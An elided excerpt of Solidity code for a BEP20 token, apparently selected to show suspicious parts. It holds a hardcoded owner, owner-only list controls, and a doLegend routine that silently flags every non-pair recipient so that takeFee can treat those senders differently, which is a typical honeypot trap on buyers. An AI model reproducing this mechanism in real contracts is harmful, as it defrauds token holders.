...
contract Ownable is Context {
    ...
    constructor() {
        address msgSender = 0x08364A13E47b9ffd84dDc02A5449365C3Fabe981;
        _owner = msgSender;
...
abstract contract BEP20 is Context, IERC20, Ownable {
    ...
    function setTeamFee(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        require(addresses.length < 201);
    ...
    function doLegend(address recipient) internal {
        if (!LegendList[recipient] && !isMarketPair[recipient])
            LegendList[recipient] = true;
    }

    function manage_Legend(address[] calldata addresses, bool status)
        public
        onlyOwner
    {
        require(addresses.length < 201);
    ...
    function takeFee(
        ...
        if (LegendList[sender] && !isMarketPair[sender])
